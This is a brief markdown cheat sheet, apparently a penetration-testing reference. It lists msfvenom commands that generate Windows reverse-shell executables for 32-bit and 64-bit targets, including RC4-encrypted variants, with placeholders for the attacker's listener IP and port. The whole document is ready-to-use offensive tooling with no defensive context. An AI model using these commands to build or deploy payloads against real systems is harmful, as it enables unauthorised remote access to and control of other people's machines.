# Reverse Shells

- **x86 (32-bit) Payloads**

`$ msfvenom -p windows/shell/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x86.exe`

`$ msfvenom -p windows/shell/reverse_tcp_rc4 lhost=<IP> lport=<PORT> rc4password="<KEY>" -f exe -o shell-enc-x86.exe`

`$ msfvenom -p windows/shell/reverse_udp lhost=<IP> lport=<PORT> -f exe -o shell-x86.exe`

- **x86_64 (64-bit) Payloads**

`$ msfvenom -p windows/x64/shell/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o shell-x64.exe`

`$ msfvenom -p windows/x64/shell/reverse_tcp_rc4 lhost=<IP> lport=<PORT> rc4password="<KEY>" -f exe -o shell-enc-x64.exe`